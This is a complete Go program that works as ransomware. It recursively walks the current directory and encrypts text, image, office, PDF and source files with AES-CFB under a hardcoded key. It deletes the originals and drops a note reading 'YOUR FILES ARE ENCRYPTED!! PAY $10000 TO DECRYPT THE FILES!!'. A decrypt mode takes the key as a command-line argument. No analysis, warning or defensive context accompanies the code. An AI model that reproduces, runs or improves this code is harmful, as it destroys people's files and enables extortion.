package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"io"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
)

var shouldEncryptFileTypes = []string{"txt", "jpg", "jpeg", "png", "gif", "doc", "docx", "xls", "xlsx", "pdf", "java", "c", "cpp"}
var dekey = ""

func main() {
	de := false
	if len(os.Args) > 1 {
		de = true
		dekey = os.Args[1]
	}

	searchDir := "."
	fileList := []string{}

	err := filepath.Walk(searchDir, func(path string, f os.FileInfo, err error) error {
		fileList = append(fileList, path)
		return nil
	})

	if err != nil {
		panic(err)
	}
	if de {
		for _, file := range fileList {
			if strings.Contains(file, ".ENCRYPTED") {
				decrypt(file)
			}
		}
		return
	}

	for _, file := range fileList {
		if shouldEncryptFile(file) {
			encrypt(file)
		}
	}

	writeReadme()
}

func shouldEncryptFile(f string) bool {
	sl := strings.Split(f, ".")
	fileType := sl[len(sl)-1]

	for _, s := range shouldEncryptFileTypes {
		if strings.ToLower(fileType) == s {
			return true
		}
	}
	return false
}

func writeReadme() {
	err := ioutil.WriteFile("IMPORTANT_README.TXT", []byte("YOUR FILES ARE ENCRYPTED!!\r\nPAY $10000 TO DECRYPT THE FILES!!"), 0777)
	if err != nil {
		panic(err.Error())
	}
}

func encrypt(in string) {
	plaintext, err := ioutil.ReadFile(in)
	if err != nil {
		return
	}

	key := []byte("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")

	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	b := encodeBase64(plaintext)

	ciphertext := make([]byte, aes.BlockSize+len(b))
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		panic(err)
	}

	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(ciphertext[aes.BlockSize:], b)

	err = ioutil.WriteFile(in+".ENCRYPTED", ciphertext, 0644)
	if err != nil {
		panic(err.Error())
	}

	err = os.Remove(in)
	if err != nil {
		panic(err.Error())
	}
}

func decrypt(in string) {
	encryptedtext, err := ioutil.ReadFile(in)
	if err != nil {
		return
	}

	key := []byte(dekey)

	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	if len(encryptedtext) < aes.BlockSize {
		panic("len")
	}

	iv := encryptedtext[:aes.BlockSize]
	encryptedtext = encryptedtext[aes.BlockSize:]
	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(encryptedtext, encryptedtext)

	err = ioutil.WriteFile(strings.Split(in, ".ENCRYPTED")[0], decodeBase64(encryptedtext), 0777)
	if err != nil {
		panic(err.Error())
	}

	err = os.Remove(in)
	if err != nil {
		panic(err.Error())
	}
}

func encodeBase64(b []byte) []byte {
	return []byte(base64.StdEncoding.EncodeToString(b))
}

func decodeBase64(b []byte) []byte {
	data, err := base64.StdEncoding.DecodeString(string(b))
	if err != nil {
		panic(err.Error())
	}
	return data
}
